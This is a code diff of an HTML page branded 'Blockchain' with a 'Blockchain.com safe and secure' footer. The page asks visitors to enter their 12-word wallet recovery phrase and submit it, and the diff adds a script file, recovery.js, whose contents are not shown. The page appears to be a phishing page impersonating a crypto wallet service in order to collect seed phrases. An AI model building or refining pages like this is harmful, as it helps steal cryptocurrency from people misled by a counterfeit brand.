@@ -6,41 +6,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recovery phrase</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        body{
+            background-image: url(blockchain\ back.png);
+        }
+    </style>
 </head>
-
-</div>
 <body>
     <header class="head">
-        <style>
-            body{
-                background-image: url(blockchain\ back.png);
-            }
-        </style>
         <div>
             <img src="blockchain.png" height="70px">
             <h1>Blockchain</h1>
-
-            
         </div>
-        
-            
-        
-         
-
     </header>
     <div class="phrase">
         <div class="span">
             <h2 class="shadow">Enter your Recovery Phrase</h2><br>
-            <a><textarea  class="space" type="text" placeholder="" row="4"></textarea>
-                <a><br><br>12 keywords</a><br><br>
-            <button class="btn">submit</button>
-        </div><br><br><br><br><br><br>
-        <div><footer class="footer">
-            <marquee>Blockchain.com safe and secure</marquee>
-    
-        </footer>
+            <textarea  class="space" type="text" placeholder="" row="4"></textarea>
+            <p>12 keywords</p>
+            <button  id="btn" type="button">submit</button>
         </div>
+    </div>
+    <footer class="footer">
+        <marquee>Blockchain.com safe and secure</marquee>
+    </footer>
     
-    
+    <script src="recovery.js"></script>    
 </body>
 </html>
